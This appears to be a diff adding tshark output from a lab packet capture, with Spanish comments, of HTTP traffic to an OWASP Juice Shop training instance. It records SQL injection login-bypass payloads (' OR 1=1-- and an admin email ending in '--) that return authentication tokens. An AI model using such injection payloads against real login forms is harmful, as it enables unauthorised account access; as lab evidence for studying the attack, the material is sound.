@@ -1,0 +1,13 @@
+# Peticiones HTTP y respuestas en la captura (filtro de Wireshark: http)
+# tshark -r evidencias/p5-ataque-sqli.pcap -Y http -T fields -e frame.number -e tcp.stream -e ip.src -e http.request.method -e http.request.uri -e http.response.code -e http.file_data
+frame  stream  origen         método uri                              código body
+    4       0  192.168.65.1   GET    /                                       
+    8       0  172.17.0.2            /                                200    <!-- ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors. ~ SPD
+   17       1  192.168.65.1   GET    /rest/products/search?q=apple           
+   21       1  172.17.0.2            /rest/products/search?q=apple    200    {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-t
+   31       2  192.168.65.1   POST   /rest/user/login                        {"email":"jim@juice-sh.op","password":"incorrecta"}
+   33       2  172.17.0.2            /rest/user/login                 401    Invalid email or password.
+   41       3  192.168.65.1   POST   /rest/user/login                        {"email":"' OR 1=1--","password":"cualquiercosa"}
+   43       3  172.17.0.2            /rest/user/login                 200    {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c
+   51       4  192.168.65.1   POST   /rest/user/login                        {"email":"admin@juice-sh.op'--","password":"x"}
+   53       4  172.17.0.2            /rest/user/login                 200    {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c
